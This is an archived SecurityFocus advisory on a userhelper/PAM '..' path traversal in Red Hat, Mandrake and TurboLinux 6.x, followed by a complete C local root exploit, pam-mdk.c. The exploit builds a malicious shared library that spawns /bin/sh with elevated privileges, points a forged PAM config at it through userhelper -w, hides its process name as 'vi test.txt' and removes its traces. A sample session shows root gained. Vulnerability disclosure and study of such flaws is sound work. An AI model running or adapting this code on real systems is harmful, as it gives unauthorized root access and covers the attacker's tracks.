source: http://www.securityfocus.com/bid/913/info
 
Because of double path vulnerabilities in the binary userhelper and PAM, it is possible to get root locally on RedHat 6.0 and 6.1 systems. Both userhelper and PAM follow ".." paths and userhelper allows you to specifiy a program to execute as an argument to the -w parameter (which is expected to have an entry in /etc/security/console.apps). Because of this, it's possible to specifiy a program such as "../../../tmp/myprog", which would (to userhelper) be "/etc/security/console.apps/../../../tmp/myprog". If "myprog" exists, PAM will then try to execute it (with the same filename). PAM first does a check to see if the configuration file for "../../../tmp/myprog" is in /etc/pam.d/ but also follows ".." directories -- to an attacker's custom pam configuration file. Specified inside the malicious configuration file (/tmp/myprog) would be arbitrary shared libraries to be opened with setuid privileges. The arbitrary libraries can be created by an attacker specifically to compromise superuser access, activating upon dlopen() by PAM.
 
This vulnerability also affects Mandrake Linux versions 6.0 and 6.1, as well as versions of TurboLinux Linux, version 6.0.2 and prior.


/*
 * pam-mdk.c (C) 2000 Paulo Ribeiro
 *
 * DESCRIPTION:
 * -----------
 * Mandrake Linux 6.1 has the same problem as Red Hat Linux 6.x but its
 * exploit (pamslam.sh) doesn't work on it (at least on my machine). So,
 * I created this C program based on it which exploits PAM/userhelper
 * and gives you UID 0.
 *
 * SYSTEMS TESTED:
 * --------------
 * Red Hat Linux 6.0, Red Hat Linux 6.1, Mandrake Linux 6.1.
 *
 * RESULTS:
 * -------
 * [prrar@linux prrar]$ id
 * uid=501(prrar) gid=501(prrar) groups=501(prrar)
 * [prrar@linux prrar]$ gcc pam-mdk.c -o pam-mdk
 * [prrar@linux prrar]$ ./pam-mdk
 * sh-2.03# id
 * uid=0(root) gid=501(prrar) groups=501(prrar)
 * sh-2.03#
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        FILE *fp;

        strcpy(argv[0], "vi test.txt");

        fp = fopen("abc.c", "a");
        fprintf(fp, "#include<stdlib.h>\n");
        fprintf(fp, "#include<unistd.h>\n");
        fprintf(fp, "#include<sys/types.h>\n");
        fprintf(fp, "void _init(void) {\n");
        fprintf(fp, "\tsetuid(geteuid());\n");
        fprintf(fp, "\tsystem(\"/bin/sh\");\n");
        fprintf(fp, "}");
        fclose(fp);

        system("echo -e auth\trequired\t$PWD/abc.so > abc.conf");
        system("chmod 755 abc.conf");
        system("gcc -fPIC -o abc.o -c abc.c");
        system("ld -shared -o abc.so abc.o");
        system("chmod 755 abc.so");
        system("/usr/sbin/userhelper -w ../../..$PWD/abc.conf");
        system("rm -rf abc.*");
}